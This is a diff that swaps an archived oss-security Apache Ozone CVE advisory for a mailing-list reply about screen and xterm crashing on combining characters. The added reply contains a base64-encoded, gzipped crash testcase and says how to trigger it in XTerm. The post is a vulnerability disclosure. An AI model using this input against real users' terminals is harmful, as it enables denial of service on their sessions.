@@ -1,23 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/11/19/5
-Message-ID: <6114c6b2-91b8-3040-e765-c56edcb2be02@apache.org>
-Date: Thu, 18 Nov 2021 23:06:29 +0000
-From: Siddharth Wagle <swagle@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2021/02/09/7
+Message-ID: <rvuj8p$n59$1@ciao.gmane.io>
+Date: Tue, 9 Feb 2021 18:11:37 -0000 (UTC)
+From: Tavis Ormandy <taviso@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2021-39234: Apache Ozone: Raw block data can be read bypassing ACL/authorization 
+Subject: Re: screen crash processing combining characters
 Content-Type: text/plain; charset=utf-8
 
-Description:
+On 2021-02-09, Harry Sintonen wrote:
+> On Tue, 9 Feb 2021, Tavis Ormandy wrote:
+>
+>> Hello, I noticed someone posted this to the screen-devel list. I can
+>> reproduce it here, just catting the testcase does crash my screen
+>> session.
+>>
+>> https://lists.gnu.org/archive/html/screen-devel/2021-02/msg00000.html
+>
+> I managed to reproduce this against screen + irssi. It was a bit tricky to 
+> get it triggered but eventually screen did die.
+>
 
-Authenticated users knowing the ID of an existing block can craft specific request allowing access those blocks, bypassing other security checks like ACL. 
+welp, I minimized it a bit and it crashed xterm too.
 
-This issue is being tracked as HDDS-5061
+I minimized it to 772 characters:
 
-Mitigation:
+$ wc -m input.txt
+772 input.txt
 
-Upgrade to Apache Ozone release version 1.2.0
+Here is the minimized version (gzipped and base64 encoded to avoid
+crashing anything anybody's mail client).
 
-Credit:
+$ gzip -9c < input.txt | base64
+H4sIAD7OImACA02W61IiQQyFX10WpkdZF5QFF4TVWbkoKpcZVuQyMM/iD99DTPM1p4qiTp1O0klO
+OvDp3Mf3p/gsio+4ZqB9+D4ybm+gJ8y7gesTEyffwG2EiQ3ci9fGwOLERAsDffGaGYiFiQx0JE6O
+TZk4SwOZePmjW/F6MZAK4yO/ideVAani2JZ/wpwZOBMvqyIuhHkyUDkyriRHXUDJjoLXOyASY+v8
+3gnTImf0igriwBzb8io5Nw2MyWcoR3PA1EBZ1EkN5GJsKhdbYTpoGm7/YeBScm7S1T1MRg8HeFWs
+UumhuwDcAcJkmtyuivEf8fLzox0b0I2EozLqbC3OCuMZ/dnB1CVyDHglsu/Pi9wVUu1RYELkcORn
+Yy2Rn+3S/8JcERB1Ij/zN3LXFr3GMI8GErE5N9CE2RD5r9j4V6m3twBv2Pj3VZPZ2DO0QfcbA12J
+7BW8E8bvjQl9Hsilv7CZACygzacxD4CUQRqJe8MAUrowCQdQZyA98yz5FGySDu5N5jDU1ebtRHhV
+AHVsJlyxgumicninGVO3wX3MZI643XdM1oVL2S1hP484eiB53425ePWR2yHTBCY8qyXTkhI5533l
+yH3BFvXlhL0RhOtjc9iQJfLJ2VGMsTfe70SdMOENbPz0NkQd/4iepC5qjzsw57Qu6JWRD5XGbZIP
+PRwaCAukTM6J5LxArwSmxLYJHXN0w/GIlhj/BqzYkFu8PDOVugYoWGPBZjTzDuAv/SlvOeLSUPsQ
+Y0bUrQ084tU7lRORz3GBzFlxGe4t8WInxGu8qsw8izGuMhJlNm1KOSHDW+6ih+7SwFK6ERK7ZoEs
+sLE4Lvw92InXPerk5DNlfixDJz8K0ZxGxSg484P6Be3RyjwMCQAA
 
-Apache Ozone would like to thank Marton Elek for reporting this issue.
+To reproduce in XTerm, decode the file then try to select the line.
+
+I'll send a report to Thomas Dickey.
+
+Tavis.
+
+-- 
+ _o)            $ lynx lock.cmpxchg8b.com
+ /\\  _o)  _o)  $ finger taviso@....org
+_\_V _( ) _( )  @taviso
 
